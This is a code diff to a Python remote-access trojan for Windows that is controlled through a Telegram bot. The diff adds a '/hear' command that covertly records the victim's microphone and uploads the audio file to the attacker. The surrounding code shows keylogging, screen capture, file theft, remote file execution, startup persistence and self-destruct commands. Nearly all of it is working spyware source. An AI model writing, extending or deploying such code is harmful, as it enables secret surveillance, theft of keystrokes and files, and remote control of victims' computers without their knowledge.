@@ -1,12 +1,13 @@
 #!/usr/bin/env python
-from PIL import ImageGrab
+from PIL import ImageGrab #/capture_pc
 from time import strftime, sleep
-from shutil import copyfile, copyfileobj, rmtree
+from shutil import copyfile, copyfileobj, rmtree #/ls, /pwd, /cd /copy
 from sys import argv, path
 from json import loads
 from winshell import startup
 from tendo import singleton
 from win32com.client import Dispatch
+import pyaudio, wave #/hear
 import telepot, requests
 import os, os.path, platform, ctypes
 import pyHook, pythoncom
@@ -20,20 +21,21 @@ known_ids = []
 known_ids.append(os.environ['TELEGRAM_CHAT_ID']) # make sure to remove this line if you don't have this environment variable
 
 # functionalities dictionary: command:arguments
-functionalities = { '/capture_pc' : '', 
-					'/cd':'<target_dir>', 
-					'/delete':'<target_file>', 
-					'/download':'<target_file>', 
-					'/ip_info':'', 
-					'/keylogs':'', 
-					'/ls':'[target_folder]', 
-					'/msg_box':'<text>', 
-					'/pc_info':'', 
-					'/play':'<youtube_videoId>', 
-					'/pwd':'', 
-					'/run_file':'<target_file>', 
-					'/self_destruct':'', 
-					'/to':''}
+functionalities = { '/capture_pc' : '', \
+					'/cd':'<target_dir>', \
+					'/delete':'<target_file>', \
+					'/download':'<target_file>', \
+					'/hear':'[time in seconds, default=5s]', \
+					'/ip_info':'', \
+					'/keylogs':'', \
+					'/ls':'[target_folder]', \
+					'/msg_box':'<text>', \
+					'/pc_info':'', \
+					'/play':'<youtube_videoId>', \
+					'/pwd':'', \
+					'/run_file':'<target_file>', \
+					'/self_destruct':'', \
+					'/to':'<target_computer>, [other_target_computer]'}
 def checkchat_id(chat_id):
 	return len(known_ids) == 0 or str(chat_id) in known_ids
 if (argv[0]).endswith('.exe'):
@@ -130,6 +132,40 @@ def handle(msg):
 						bot.sendDocument(chat_id, open(path_file, 'rb'))
 					except:
 						response = 'Could not find ' + path_file
+			elif command.startswith('/hear'):
+				SECONDS = -1
+				try:
+					SECONDS = int(command.replace('/hear','').strip())
+				except:
+					SECONDS = 30
+				 
+				CHANNELS = 2
+				CHUNK = 1024
+				FORMAT = pyaudio.paInt16
+				RATE = 44100
+				 
+				audio = pyaudio.PyAudio()
+				bot.sendChatAction(chat_id, 'typing')
+				stream = audio.open(format=FORMAT, channels=CHANNELS,
+								rate=RATE, input=True,
+								frames_per_buffer=CHUNK)
+				frames = []
+				for i in range(0, int(RATE / CHUNK * SECONDS)):
+					data = stream.read(CHUNK)
+					frames.append(data)
+				stream.stop_stream()
+				stream.close()
+				audio.terminate()
+				
+				wav_path = hide_folder + '\\mouthlogs.wav'
+				waveFile = wave.open(wav_path, 'wb')
+				waveFile.setnchannels(CHANNELS)
+				waveFile.setsampwidth(audio.get_sample_size(FORMAT))
+				waveFile.setframerate(RATE)
+				waveFile.writeframes(b''.join(frames))
+				waveFile.close()
+				bot.sendChatAction(chat_id, 'upload_document')
+				bot.sendAudio(chat_id, audio=open(wav_path, 'rb'))
 			elif command == '/ip_info':
 				bot.sendChatAction(chat_id, 'find_location')
 				info = requests.get('http://ipinfo.io').text
@@ -218,7 +254,7 @@ def handle(msg):
 						msg = {'text' : command, 'chat' : { 'id' : chat_id }}
 						handle(msg)
 			elif command == '/help':
-				response = "\n".join(str(x) for x in functionalities.keys())
+				response = "\n".join(command+': '+description for command,description in functionalities.items())
 			else: # redirect to /help
 				msg = {'text' : '/help', 'chat' : { 'id' : chat_id }}
 				handle(msg)
